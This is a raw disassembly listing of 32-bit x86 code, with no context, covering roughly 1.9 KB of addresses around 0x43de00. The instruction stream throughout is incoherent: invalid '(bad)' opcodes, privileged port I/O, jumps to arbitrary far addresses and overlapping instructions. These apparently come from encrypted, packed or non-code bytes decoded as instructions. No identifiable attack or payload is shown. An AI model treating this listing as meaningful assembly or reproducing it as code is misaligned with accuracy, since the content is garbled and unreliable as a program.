  43ddeb:	loop   0x43de14
  43dded:	test   al,0x4b
  43ddef:	push   ebx
  43ddf0:	sub    DWORD PTR [ecx-0xd],esi
  43ddf3:	nop
  43ddf4:	dec    ebx
  43ddf5:	or     esi,esi
  43ddf7:	jne    0x43de77
  43ddf9:	sub    DWORD PTR ds:0xf89c211e,esp
  43ddff:	and    ebp,esp
  43de01:	mov    al,ds:0x14e2a7cb
  43de06:	jmp    FWORD PTR [eax+0x1a52f722]
  43de0c:	sub    eax,0x3096974d
  43de11:	mov    eax,ds:0xad7d08bd
  43de16:	sbb    ebx,DWORD PTR [edx+edx*8]
  43de19:	jae    0x43de0e
  43de1b:	push   ecx
  43de1c:	inc    esp
  43de1d:	cmp    edi,DWORD PTR fs:[esi+0x1b]
  43de21:	jmp    0xea8496d8
  43de26:	adc    esi,DWORD PTR [ebx-0x44]
  43de29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43de2a:	jmp    0x43de2c
  43de2c:	and    al,0x55
  43de2e:	xor    edi,ebp
  43de30:	xor    BYTE PTR [ebx],ch
  43de32:	stos   BYTE PTR es:[edi],al
  43de33:	hlt    
  43de34:	inc    edi
  43de35:	das    
  43de36:	aaa    
  43de37:	call   0xec207419
  43de3c:	in     al,dx
  43de3d:	sbb    dl,BYTE PTR [ecx+0x3]
  43de40:	cmc    
  43de41:	push   0xb0e883
  43de46:	add    ch,al
  43de48:	sbb    BYTE PTR [ecx],bh
  43de4a:	xor    esi,DWORD PTR [ecx-0xe]
  43de4d:	mov    esp,edi
  43de4f:	mov    esp,0x60db99bc
  43de54:	in     eax,0x55
  43de56:	into   
  43de57:	mov    bh,0xb6
  43de59:	int    0x6e
  43de5b:	and    eax,0xa4bb0c99
  43de60:	clc    
  43de61:	sar    dl,1
  43de63:	mov    ch,al
  43de65:	xchg   esi,eax
  43de66:	gs hlt 
  43de68:	das    
  43de69:	scas   eax,DWORD PTR es:[edi]
  43de6a:	mov    edi,0x24ac9bad
  43de6f:	popa   
  43de70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43de71:	xor    ah,bl
  43de73:	shl    BYTE PTR [edi],1
  43de75:	mov    BYTE PTR [ecx-0x19],bh
  43de78:	jb     0x43de4f
  43de7a:	jnp    0x43de26
  43de7c:	call   0x1887199e
  43de81:	xor    edx,DWORD PTR [edi-0x68]
  43de84:	or     DWORD PTR [ebx],ebx
  43de86:	call   0xbf692704
  43de8b:	sbb    DWORD PTR [edi+0x16e278a5],ecx
  43de91:	sub    BYTE PTR [ebx-0x35],bl
  43de94:	xlat   BYTE PTR ds:[ebx]
  43de95:	enter  0xce95,0x5e
  43de99:	std    
  43de9a:	xchg   BYTE PTR [eax],al
  43de9c:	adc    al,0xe6
  43de9e:	or     dl,BYTE PTR [ebx]
  43dea0:	sbb    eax,0x9be1e6c9
  43dea5:	scas   al,BYTE PTR es:[edi]
  43dea6:	mov    DWORD PTR gs:[eax],esp
  43dea9:	xor    BYTE PTR es:[ecx+0x1b],bl
  43dead:	cdq    
  43deae:	dec    esp
  43deaf:	mov    ebp,0x45dabe31
  43deb4:	and    DWORD PTR [ecx+0x21],ebp
  43deb7:	repnz lahf 
  43deb9:	rcr    DWORD PTR [edx],cl
  43debb:	xchg   edi,eax
  43debc:	lods   eax,DWORD PTR ds:[esi]
  43debd:	mov    ds:0x94334a9b,al
  43dec2:	mov    ds:0xcbd802ad,eax
  43dec7:	call   0x65034e61
  43decc:	call   0xb714d878
  43ded1:	jmp    0x1111:0xcbf261a0
  43ded8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ded9:	dec    eax
  43deda:	mov    fs,WORD PTR [ebp-0x63]
  43dedd:	add    BYTE PTR cs:[eax-0x29],dh
  43dee1:	pop    ss
  43dee2:	clc    
  43dee3:	pusha  
  43dee4:	xlat   BYTE PTR ds:[ebx]
  43dee5:	inc    ecx
  43dee6:	mov    edi,0x9a1f97a4
  43deeb:	pop    esi
  43deec:	int    0x9d
  43deee:	stos   DWORD PTR es:[edi],eax
  43deef:	jbe    0x43df4e
  43def1:	scas   al,BYTE PTR es:[edi]
  43def2:	lock cmc 
  43def4:	lds    esi,FWORD PTR [esi]
  43def6:	dec    eax
  43def7:	adc    BYTE PTR [esi+0x2],0xbf
  43defb:	inc    esp
  43defc:	cwde   
  43defd:	lds    ebp,FWORD PTR [ebp+0x3e79b581]
  43df03:	out    dx,al
  43df04:	pop    ebx
  43df05:	outs   dx,BYTE PTR ds:[esi]
  43df06:	pusha  
  43df07:	pop    edi
  43df08:	xchg   esi,eax
  43df09:	xor    BYTE PTR ds:0xb2cc70c4,ch
  43df0f:	inc    esp
  43df10:	or     eax,0xd0c459c9
  43df15:	mov    dl,0xeb
  43df17:	jmp    0x32929633
  43df1c:	int3   
  43df1d:	or     DWORD PTR fs:[esi-0x74],esi
  43df21:	pop    ecx
  43df22:	mov    eax,0x4167f94a
  43df27:	adc    al,0xf5
  43df29:	push   ds
  43df2a:	mov    cl,0x2b
  43df2c:	cwde   
  43df2d:	out    dx,eax
  43df2e:	imul   ecx,ebx,0xffffffb7
  43df31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43df32:	call   ebx
  43df34:	mov    bl,0x94
  43df36:	sub    al,0x5f
  43df38:	lahf   
  43df39:	pop    ebp
  43df3a:	mov    bh,BYTE PTR [ebp+0x35]
  43df3d:	js     0x43def9
  43df3f:	in     eax,0xb2
  43df41:	adc    DWORD PTR [esi+eiz*4+0x45],esi
  43df45:	sbb    eax,0xe281f39d
  43df4a:	into   
  43df4b:	pop    edx
  43df4c:	and    cl,bh
  43df4e:	jmp    0x4ebb:0x6f378542
  43df55:	loope  0x43df19
  43df57:	push   esi
  43df58:	add    eax,0x78f13e8b
  43df5d:	jnp    0x43df63
  43df5f:	xor    eax,0x71783924
  43df64:	rol    DWORD PTR [ecx-0x60696b36],1
  43df6a:	retf   
  43df6b:	lock inc eax
  43df6d:	idiv   BYTE PTR [ecx]
  43df6f:	in     eax,dx
  43df70:	fisub  WORD PTR [ebp-0x76037738]
  43df76:	in     al,0x44
  43df78:	loope  0x43df19
  43df7a:	xor    al,0xba
  43df7c:	stc    
  43df7d:	mov    cl,0x92
  43df7f:	jg     0x43df66
  43df81:	xlat   BYTE PTR ds:[ebx]
  43df82:	xor    eax,0x7e82e7e5
  43df87:	rcl    BYTE PTR [ebx+0x49],cl
  43df8a:	lods   al,BYTE PTR ds:[esi]
  43df8b:	ss xchg esi,eax
  43df8d:	sbb    DWORD PTR [eax-0x54],0xd
  43df91:	inc    esi
  43df92:	popa   
  43df93:	in     eax,dx
  43df94:	cmc    
  43df95:	aam    0xa8
  43df97:	in     eax,0x69
  43df99:	dec    edi
  43df9a:	ror    DWORD PTR ds:0xce70c928,0x49
  43dfa1:	adc    ebp,DWORD PTR [ecx-0x61]
  43dfa4:	push   ds
  43dfa5:	sbb    al,0x56
  43dfa7:	int3   
  43dfa8:	xchg   ebp,eax
  43dfa9:	fwait
  43dfaa:	mov    ecx,0xd228a3ef
  43dfaf:	xlat   BYTE PTR ds:[ebx]
  43dfb0:	in     al,dx
  43dfb1:	push   eax
  43dfb2:	sbb    ch,al
  43dfb4:	and    ah,dh
  43dfb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43dfb7:	leave  
  43dfb8:	es jnp 0x43df9e
  43dfbb:	and    edi,edx
  43dfbd:	jo     0x43dfbd
  43dfbf:	jecxz  0x43dfcd
  43dfc1:	cwde   
  43dfc2:	aas    
  43dfc3:	xchg   edx,eax
  43dfc4:	adc    BYTE PTR [ecx-0x4bf6cb38],ah
  43dfca:	gs inc ebx
  43dfcc:	imul   esp,DWORD PTR ds:0x9f5400f5,0x1b
  43dfd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dfd4:	xchg   ecx,eax
  43dfd5:	call   0xf688:0xf31d0811
  43dfdc:	sbb    al,0x89
  43dfde:	xchg   esp,eax
  43dfdf:	adc    eax,DWORD PTR [ecx]
  43dfe1:	shr    DWORD PTR [edi+0xba8912f],cl
  43dfe7:	cmp    ah,BYTE PTR [ecx-0x7a16aa0a]
  43dfed:	je     0x43dfd3
  43dfef:	jns    0x43e065
  43dff1:	enter  0xd4bf,0xe8
  43dff5:	dec    esi
  43dff6:	mov    ebx,DWORD PTR [esi-0xa]
  43dff9:	aas    
  43dffa:	ret    
  43dffb:	fisub  DWORD PTR [ecx]
  43dffd:	lods   eax,DWORD PTR ds:[esi]
  43dffe:	jecxz  0x43e065
  43e000:	mov    al,ds:0xeba6c6f0
  43e005:	nop
  43e006:	sbb    DWORD PTR [eax+0x45],0x12
  43e00a:	mov    eax,0xd5e9e974
  43e00f:	and    dh,BYTE PTR [ebp+0x34e71d26]
  43e015:	int    0xb7
  43e017:	leave  
  43e018:	pop    ds
  43e019:	sub    eax,esp
  43e01b:	in     eax,0x7c
  43e01d:	xor    eax,ecx
  43e01f:	jo     0x43e01b
  43e021:	mov    bl,0xcb
  43e023:	dec    edi
  43e024:	dec    ebp
  43e025:	test   al,0x4a
  43e027:	fucomip st,st(3)
  43e029:	mov    al,ds:0x294ef6c8
  43e02e:	sti    
  43e02f:	pop    ss
  43e030:	sar    BYTE PTR [ecx+0x55],1
  43e033:	xchg   esi,eax
  43e034:	ror    edx,1
  43e036:	jne    0x43e01d
  43e038:	push   ss
  43e039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e03a:	inc    ebp
  43e03b:	aaa    
  43e03c:	inc    ecx
  43e03d:	mov    dl,0x13
  43e03f:	inc    esp
  43e040:	nop    DWORD PTR [ecx+0x18]
  43e044:	stos   BYTE PTR es:[edi],al
  43e045:	jl     0x43e07f
  43e047:	add    esi,esi
  43e049:	xchg   esi,eax
  43e04a:	das    
  43e04b:	add    al,0x9c
  43e04d:	fimul  DWORD PTR [esi-0x43f8d7c7]
  43e053:	jno    0x43e04f
  43e055:	mov    ecx,0x791c609a
  43e05a:	jmp    0x997b:0x2a146946
  43e061:	adc    al,0x7c
  43e063:	xor    dh,dl
  43e065:	(bad)  
  43e066:	aaa    
  43e067:	cmp    al,0xd3
  43e069:	in     eax,0xa4
  43e06b:	in     eax,dx
  43e06c:	sbb    eax,0xcff09199
  43e071:	adc    al,0x54
  43e073:	and    DWORD PTR [edx],ebp
  43e075:	inc    edx
  43e076:	jecxz  0x43e021
  43e078:	xchg   ebp,eax
  43e079:	adc    BYTE PTR [edx-0x14],cl
  43e07c:	dec    edi
  43e07d:	frstor [ebp-0xb]
  43e080:	iret   
  43e081:	mov    al,ds:0x66c5b9d1
  43e086:	jge    0x43e102
  43e088:	add    esi,ebp
  43e08a:	sbb    esi,esi
  43e08c:	leave  
  43e08d:	into   
  43e08e:	sbb    ebx,esi
  43e090:	bound  ebp,QWORD PTR [ebx-0x4ebb8b15]
  43e096:	or     dl,BYTE PTR [esi+eax*4+0x1792679b]
  43e09d:	test   eax,0xee1698ff
  43e0a2:	sbb    BYTE PTR [ebp+0x11],0xb5
  43e0a6:	sti    
  43e0a7:	push   es
  43e0a8:	(bad)  
  43e0a9:	adc    dh,BYTE PTR [eax+ebx*1-0x6661e0a]
  43e0b0:	sbb    BYTE PTR [ecx],bl
  43e0b2:	outs   dx,BYTE PTR ds:[esi]
  43e0b3:	mov    ah,0x3
  43e0b5:	(bad)  
  43e0b6:	outs   dx,BYTE PTR ds:[esi]
  43e0b7:	mov    ebp,ebp
  43e0b9:	imul   edi,ebp,0x8ba5ecc7
  43e0bf:	ja     0x43e07c
  43e0c1:	outs   dx,BYTE PTR ds:[esi]
  43e0c2:	test   DWORD PTR [ebx],esp
  43e0c4:	sbb    DWORD PTR [ecx+0x7c],ebx
  43e0c7:	neg    edx
  43e0c9:	cli    
  43e0ca:	push   edi
  43e0cb:	aaa    
  43e0cc:	push   ecx
  43e0cd:	pushf  
  43e0ce:	fwait
  43e0cf:	adc    dl,BYTE PTR [ebp-0x51ece3d7]
  43e0d5:	pop    esp
  43e0d6:	test   DWORD PTR [eax+esi*4],0x255a894
  43e0dd:	cmp    ebx,DWORD PTR [ebp+0x23177f01]
  43e0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e0e4:	pushf  
  43e0e5:	xchg   ebx,eax
  43e0e6:	mov    ah,0x5a
  43e0e8:	inc    esp
  43e0e9:	mov    al,0xbc
  43e0eb:	fs pop ss
  43e0ed:	scas   al,BYTE PTR es:[edi]
  43e0ee:	cwde   
  43e0ef:	loopne 0x43e166
  43e0f1:	adc    BYTE PTR [ecx-0x13],bh
  43e0f4:	pop    ebp
  43e0f5:	add    DWORD PTR [eax-0xf],esp
  43e0f8:	mov    WORD PTR [ecx-0x15],gs
  43e0fb:	scas   eax,DWORD PTR es:[edi]
  43e0fc:	or     al,0xe6
  43e0fe:	add    BYTE PTR [edi-0x29165b43],dh
  43e104:	jae    0x43e093
  43e106:	push   ebp
  43e108:	mov    dl,0xa0
  43e10a:	mov    esi,DWORD PTR [edi+0x1c74095d]
  43e110:	adc    DWORD PTR [ebp+ebx*8-0x4e75afa0],edx
  43e117:	inc    esp
  43e118:	jmp    0xfc12:0x25fa303f
  43e11f:	out    0xee,eax
  43e121:	pusha  
  43e122:	or     DWORD PTR [ecx+0x1b],edx
  43e125:	leave  
  43e126:	mov    ebp,0x370412bd
  43e12b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e12c:	js     0x43e0d5
  43e12e:	sbb    esi,DWORD PTR [ecx]
  43e130:	jge    0x43e17e
  43e132:	ret    
  43e133:	je     0x43e0e9
  43e135:	loop   0x43e0e0
  43e137:	mov    dh,0xac
  43e139:	xchg   DWORD PTR [edi+0xc941b84],esi
  43e13f:	retf   0xf085
  43e142:	cmp    eax,0xcd8dd7ec
  43e147:	xchg   edi,eax
  43e148:	push   ss
  43e149:	leave  
  43e14a:	repnz sub al,0xfd
  43e14d:	adc    ebp,DWORD PTR [edi-0x80]
  43e150:	outs   dx,BYTE PTR ds:[esi]
  43e151:	sahf   
  43e152:	jnp    0x43e177
  43e154:	lods   al,BYTE PTR ds:[esi]
  43e155:	call   0x85d:0x548f27f4
  43e15c:	loope  0x43e110
  43e15e:	xchg   ebp,eax
  43e15f:	out    0x89,al
  43e161:	pop    edx
  43e162:	mov    ebp,0xeb9f9574
  43e167:	pop    ds
  43e168:	fwait
  43e169:	pop    ss
  43e16a:	(bad)  
  43e16b:	(bad)  
  43e16c:	pop    edx
  43e16d:	je     0x43e17d
  43e16f:	mov    WORD PTR [ebp-0x38],es
  43e172:	mov    ecx,0xb59a9d24
  43e177:	jmp    0xf4e1ace1
  43e17c:	test   eax,0x1e6ac833
  43e181:	mov    eax,0xcf6d5bf0
  43e186:	es mov ch,0x28
  43e189:	je     0x43e125
  43e18b:	jne    0x43e14f
  43e18d:	lahf   
  43e18e:	stos   BYTE PTR es:[edi],al
  43e18f:	sbb    BYTE PTR [ecx],ah
  43e191:	fnstenv [ecx]
  43e193:	push   cs
  43e194:	aas    
  43e195:	mov    bh,0x96
  43e197:	push   ds
  43e198:	push   eax
  43e199:	mov    ds:0x2c419bdb,eax
  43e19e:	xor    al,0xcc
  43e1a0:	mov    al,ds:0x647dde9f
  43e1a5:	ins    BYTE PTR es:[edi],dx
  43e1a6:	mov    edi,0x7a347a54
  43e1ab:	hlt    
  43e1ac:	xchg   esi,eax
  43e1ad:	cmp    bl,BYTE PTR [eax]
  43e1af:	adc    eax,0xadcc4b0
  43e1b4:	inc    ebp
  43e1b5:	and    bh,BYTE PTR [edx-0x3db780f4]
  43e1bb:	test   dh,cl
  43e1bd:	add    dl,BYTE PTR [edx+esi*1-0x3a]
  43e1c1:	(bad)  
  43e1c2:	jnp    0x43e1b8
  43e1c4:	int    0x98
  43e1c6:	mov    ah,0x3f
  43e1c8:	pop    ds
  43e1c9:	pop    es
  43e1ca:	lods   eax,DWORD PTR ds:[esi]
  43e1cb:	push   esi
  43e1cc:	push   ss
  43e1cd:	sub    DWORD PTR [eax],ecx
  43e1cf:	mov    BYTE PTR [edx+0x29],al
  43e1d2:	ret    
  43e1d3:	ret    0x953a
  43e1d6:	mov    ebx,ss
  43e1d8:	mov    eax,0xef31ef42
  43e1dd:	inc    edx
  43e1de:	mov    bl,0xda
  43e1e0:	std    
  43e1e1:	sbb    DWORD PTR [edi+ebp*1],esi
  43e1e4:	lahf   
  43e1e5:	mov    ds:0x8a04f549,al
  43e1ea:	pushf  
  43e1eb:	fisub  WORD PTR [esi]
  43e1ed:	pop    eax
  43e1ee:	test   BYTE PTR [edx],dl
  43e1f0:	adc    BYTE PTR [ecx-0x7d],bh
  43e1f3:	pop    esi
  43e1f4:	push   ss
  43e1f5:	jp     0x43e1ab
  43e1f7:	shl    BYTE PTR ds:0x65c4ea68,0x20
  43e1fe:	(bad)  
  43e1ff:	or     ebp,DWORD PTR [esi]
  43e201:	inc    edx
  43e202:	pop    esp
  43e203:	gs ret 
  43e205:	nop
  43e206:	call   0x241d:0x771576b0
  43e20d:	test   al,0x25
  43e20f:	dec    ebp
  43e210:	and    ch,cl
  43e212:	add    eax,0x8c3e5a6e
  43e217:	mov    edx,0xfb5b9f3a
  43e21c:	dec    eax
  43e21d:	stos   DWORD PTR es:[edi],eax
  43e21e:	fsubr  DWORD PTR [edi-0x300609f7]
  43e224:	mov    ds:0xafc4bd33,al
  43e229:	pop    ebx
  43e22a:	push   edx
  43e22b:	and    BYTE PTR ds:0x3eeb207e,ah
  43e231:	add    BYTE PTR [ebx],ch
  43e233:	pop    ecx
  43e234:	mov    cl,BYTE PTR [ecx-0x2ff2965b]
  43e23a:	aaa    
  43e23b:	out    0x63,eax
  43e23d:	sar    DWORD PTR [edx+0x3ba1cc90],cl
  43e243:	call   edx
  43e245:	test   BYTE PTR [esi],0xa8
  43e248:	sub    al,0x1d
  43e24a:	jl     0x43e2c8
  43e24c:	dec    ebp
  43e24d:	mov    dl,0xb5
  43e24f:	je     0x43e226
  43e251:	xchg   ebx,eax
  43e252:	xchg   ecx,eax
  43e253:	outs   dx,BYTE PTR ds:[esi]
  43e254:	in     al,dx
  43e255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e256:	cmp    ebp,esp
  43e258:	sbb    eax,0xd95f4cec
  43e25d:	test   BYTE PTR [edi-0x422de154],ch
  43e263:	aam    0xda
  43e265:	scas   eax,DWORD PTR es:[edi]
  43e266:	add    ecx,ebx
  43e268:	push   ebp
  43e269:	mov    dl,0x2e
  43e26b:	out    0x4,al
  43e26d:	retf   0xae72
  43e270:	(bad)  
  43e271:	sbb    al,0x84
  43e273:	inc    edx
  43e274:	push   ebp
  43e275:	retf   0xe5a0
  43e278:	mov    ebx,0xe58e4bd4
  43e27d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e27e:	mov    eax,0xc5d5e5e6
  43e283:	xor    BYTE PTR [ecx-0x8],al
  43e286:	mov    fs,WORD PTR [esi]
  43e288:	sbb    BYTE PTR [ecx+0x662f03fe],bl
  43e28e:	scas   eax,DWORD PTR es:[edi]
  43e28f:	cmp    BYTE PTR [ecx-0x58],bh
  43e292:	retf   
  43e293:	rcl    dh,cl
  43e295:	cli    
  43e296:	adc    ah,BYTE PTR [esi+0x58cf1614]
  43e29c:	cmp    eax,0xef54cefd
  43e2a1:	sub    DWORD PTR [edi],ecx
  43e2a3:	pop    ecx
  43e2a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e2a5:	test   al,0xbb
  43e2a7:	or     esp,DWORD PTR [esp+edx*2+0x44486931]
  43e2ae:	jp     0x43e29c
  43e2b0:	mov    ah,0x99
  43e2b2:	xchg   ebx,eax
  43e2b3:	enter  0x942c,0xe7
  43e2b7:	and    al,BYTE PTR [ecx-0x5a]
  43e2ba:	sub    eax,DWORD PTR [esi-0x3db11935]
  43e2c0:	loopne 0x43e293
  43e2c2:	dec    ebp
  43e2c3:	xor    esi,DWORD PTR [edx+0x2e]
  43e2c6:	shl    BYTE PTR [ebx+edx*2],0xac
  43e2ca:	pop    ebx
  43e2cb:	fcom   QWORD PTR [ecx-0x13c8475]
  43e2d1:	mov    ds:0x91d618b8,eax
  43e2d6:	inc    esi
  43e2d7:	and    dh,BYTE PTR [ecx-0x54]
  43e2da:	or     dl,bl
  43e2dc:	into   
  43e2dd:	ret    0x6d3f
  43e2e0:	pop    ss
  43e2e1:	pop    ecx
  43e2e2:	adc    dl,ah
  43e2e4:	adc    bh,dl
  43e2e6:	dec    esi
  43e2e7:	pop    ebx
  43e2e8:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  43e2ea:	sti    
  43e2eb:	jnp    0x43e290
  43e2ed:	(bad)  
  43e2ee:	xor    DWORD PTR [ecx-0x7],ecx
  43e2f1:	pop    ecx
  43e2f2:	in     al,0xc9
  43e2f4:	lea    esi,[edi+0x4f5a74b9]
  43e2fa:	mov    ah,0x41
  43e2fc:	jne    0x43e2b5
  43e2fe:	fsub   st(5),st
  43e300:	fsubr  st(5),st
  43e302:	(bad)  
  43e303:	xchg   esi,eax
  43e304:	cmp    eax,0x4f77
  43e309:	jmp    0x8e0a:0xe899f4bd
  43e310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e311:	jl     0x43e382
  43e313:	addr16 push ds
  43e315:	test   eax,0x960c08a4
  43e31a:	add    DWORD PTR [edx-0x1dd7e6dd],ebx
  43e320:	retf   
  43e321:	pop    eax
  43e322:	int3   
  43e323:	fs out dx,al
  43e325:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e326:	imul   esi,DWORD PTR [ecx],0x16
  43e329:	das    
  43e32a:	(bad)  
  43e32b:	loope  0x43e322
  43e32d:	je     0x43e2b1
  43e32f:	add    eax,0xb4b93b9e
  43e334:	jmp    0xd62b:0x5592600b
  43e33b:	out    0x6f,al
  43e33d:	mov    eax,ds:0x991a2af6
  43e342:	jle    0x43e344
  43e344:	mov    dl,0xf6
  43e346:	cmp    esp,DWORD PTR [ebp+0x289d7f55]
  43e34c:	int3   
  43e34d:	call   0x8f89:0x5d5e1213
  43e354:	sbb    DWORD PTR [ecx+0x4c],ecx
  43e357:	lods   al,BYTE PTR ds:[esi]
  43e358:	enter  0x2bc8,0xbe
  43e35c:	in     eax,dx
  43e35d:	rcr    DWORD PTR [ebx+0x347abadc],1
  43e363:	and    BYTE PTR [ecx],0xe2
  43e366:	push   DWORD PTR [edi+0x19]
  43e369:	or     DWORD PTR [ecx+0x47efa38e],esi
  43e36f:	popa   
  43e370:	jecxz  0x43e313
  43e372:	mov    ebx,0x9a9e6239
  43e377:	aam    0x2a
  43e379:	lock inc BYTE PTR [ecx]
  43e37c:	inc    ebp
  43e37d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e37e:	ficom  WORD PTR [eax+esi*1+0x162e21a6]
  43e385:	lahf   
  43e386:	fwait
  43e387:	adc    BYTE PTR [ecx],al
  43e389:	mov    al,BYTE PTR ds:[ebp-0xc]
  43e38d:	iret   
  43e38e:	dec    edx
  43e38f:	stos   DWORD PTR es:[edi],eax
  43e390:	stc    
  43e391:	or     esi,DWORD PTR [esp+edx*4-0x600d1d85]
  43e398:	in     eax,dx
  43e399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e39a:	stos   DWORD PTR es:[edi],eax
  43e39b:	iret   
  43e39c:	inc    esi
  43e39d:	jbe    0x43e392
  43e39f:	ins    DWORD PTR es:[edi],dx
  43e3a0:	mov    DWORD PTR [esi-0x37],eax
  43e3a3:	retf   
  43e3a4:	mov    ?,WORD PTR [esi+edi*4-0xd709b7c]
  43e3ab:	mov    dl,0x78
  43e3ad:	ins    BYTE PTR es:[edi],dx
  43e3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e3af:	jo     0x43e37d
  43e3b1:	push   0xa09dfdfe
  43e3b6:	jnp    0x43e418
  43e3b8:	adc    DWORD PTR [edx+0x6],ebp
  43e3bb:	push   esi
  43e3bc:	add    ebx,edi
  43e3be:	jmp    0x8c09e98d
  43e3c3:	jle    0x43e366
  43e3c5:	pop    edx
  43e3c6:	add    eax,0x8ba524e8
  43e3cb:	mov    ecx,DWORD PTR [eax+0x6e21277b]
  43e3d1:	ja     0x43e3f3
  43e3d3:	sti    
  43e3d4:	jns    0x43e400
  43e3d6:	mov    ebx,0xadc6fa64
  43e3db:	add    al,0x45
  43e3dd:	sbb    eax,0x828be99e
  43e3e2:	into   
  43e3e3:	push   0x1e
  43e3e5:	imul   eax,DWORD PTR [edi+0x16],0xa3c5e3a0
  43e3ec:	pop    ebp
  43e3ed:	mov    dh,0x4b
  43e3ef:	mov    al,0x4
  43e3f1:	retf   
  43e3f2:	mov    WORD PTR [edx+esi*2+0x18],gs
  43e3f6:	fstp   TBYTE PTR [esi+0x5cb5aa33]
  43e3fc:	dec    eax
  43e3fd:	jge    0x43e3b3
  43e3ff:	les    ebp,FWORD PTR [esi]
  43e401:	inc    eax
  43e402:	jle    0x43e3c3
  43e404:	and    eax,0x50c89ba4
  43e409:	neg    BYTE PTR [eax-0x6c]
  43e40c:	jecxz  0x43e412
  43e40e:	call   0xbf06315a
  43e413:	mov    ah,0xb0
  43e415:	int3   
  43e416:	xchg   ebp,eax
  43e417:	stc    
  43e418:	(bad)
  43e41b:	jmp    0x791a:0xf3617601
  43e422:	pop    esp
  43e423:	jl     0x43e46e
  43e425:	or     dh,BYTE PTR [ecx]
  43e427:	hlt    
  43e428:	fs sahf 
  43e42a:	dec    ebx
  43e42b:	dec    esp
  43e42c:	(bad)  
  43e42d:	out    0x21,eax
  43e42f:	xchg   ebp,eax
  43e430:	add    al,0x6b
  43e432:	sub    al,0x21
  43e434:	les    ecx,FWORD PTR [esi]
  43e436:	nop
  43e437:	xor    eax,0xede2cccd
  43e43c:	add    al,0xb1
  43e43e:	xor    ch,bl
  43e440:	adc    eax,0x86f39d93
  43e445:	add    edx,DWORD PTR [eax]
  43e447:	sub    DWORD PTR [esi+0x4e012ff0],0xffffffe3
  43e44e:	mov    al,0xa4
  43e450:	fld    QWORD PTR [eax]
  43e452:	in     al,0x1a
  43e454:	es push eax
  43e456:	sti    
  43e457:	sbb    BYTE PTR [ebx],ch
  43e459:	xchg   BYTE PTR [ebx-0xc],bh
  43e45c:	push   edx
  43e45d:	dec    ebx
  43e45e:	mov    esp,0xb943e17e
  43e463:	xchg   esp,eax
  43e464:	(bad)  
  43e465:	cs jne 0x43e466
  43e468:	xor    eax,0xf5eb7218
  43e46d:	mov    al,BYTE PTR [edx+0x5c]
  43e470:	and    bl,BYTE PTR [ecx]
  43e472:	cmc    
  43e473:	adc    ah,BYTE PTR ds:0xbf397b2a
  43e479:	jmp    0x50d9dbe9
  43e47e:	mov    bh,BYTE PTR es:[edi]
  43e481:	mov    eax,0x65c3f32c
  43e486:	fsub   DWORD PTR ds:[ecx+edi*1]
  43e48a:	mov    bh,0x8f
  43e48c:	pop    es
  43e48d:	sub    edi,DWORD PTR ds:0xc3c8652e
  43e493:	dec    DWORD PTR [ebx-0x5cca59c6]
  43e499:	jecxz  0x43e4a4
  43e49b:	sti    
  43e49c:	push   ds
  43e49d:	mov    DWORD PTR [ebp-0x69397375],esi
  43e4a3:	sbb    dh,bl
  43e4a5:	leave  
  43e4a6:	dec    ebx
  43e4a7:	xchg   esp,eax
  43e4a8:	(bad)  
  43e4aa:	sub    ah,BYTE PTR [ebx]
  43e4ac:	sbb    BYTE PTR [edi+0x19162690],ah
  43e4b2:	dec    ebx
  43e4b3:	add    eax,0x91f4331b
  43e4b8:	(bad)  
  43e4b9:	test   al,0x6b
  43e4bb:	ins    DWORD PTR es:[edi],dx
  43e4bc:	outs   dx,BYTE PTR ds:[esi]
  43e4bd:	ja     0x43e514
  43e4bf:	dec    eax
  43e4c0:	inc    edi
  43e4c1:	jg     0x43e4c9
  43e4c3:	shl    esi,0xfc
  43e4c6:	mov    ebp,0xdc308424
  43e4cb:	pop    ds
  43e4cc:	lds    esp,FWORD PTR [ebp+0x705ef7ca]
  43e4d2:	ja     0x43e4f3
  43e4d4:	and    BYTE PTR [eax+0x38447034],0xb1
  43e4db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e4dc:	(bad)  
  43e4dd:	cli    
  43e4de:	gs (bad) 
  43e4e0:	(bad)  
  43e4e1:	xchg   edi,eax
  43e4e2:	mov    ds,WORD PTR [ebx+ebp*8]
  43e4e5:	or     esp,DWORD PTR [ebx]
  43e4e7:	sub    ebx,DWORD PTR [ebx]
  43e4e9:	add    DWORD PTR [ecx-0x4439e112],esi
  43e4ef:	aam    0xae
  43e4f1:	add    BYTE PTR [ebx-0x6a],0xd6
  43e4f5:	pop    esp
  43e4f6:	jnp    0x43e523
  43e4f8:	sbb    BYTE PTR [ecx+0x1cd2bce3],0xfb
  43e4ff:	xor    al,0x6e
  43e501:	pop    esi
  43e502:	rcl    esp,0x2e
  43e505:	call   0x5e6c5873
  43e50a:	mov    ebp,0xd79f1a77
  43e50f:	xor    BYTE PTR [esi+0x21cc010a],dh
  43e515:	stc    
  43e516:	mov    ebx,DWORD PTR [edi]
  43e518:	inc    ebx
  43e519:	bound  esp,QWORD PTR [edi+0xf5c4e20]
  43e51f:	shl    edx,cl
  43e521:	adc    eax,0x47402e2b
  43e526:	sub    eax,0xba49e05
  43e52b:	cmp    DWORD PTR [esi+0x2f],esp
  43e52e:	shr    ah,cl
  43e530:	sbb    eax,0x8440249
  43e535:	push   edx
  43e536:	adc    al,0xb6
  43e538:	shl    DWORD PTR [esi+0x6549f7cb],cl
  43e53e:	in     eax,0x87
  43e540:	scas   eax,DWORD PTR es:[edi]
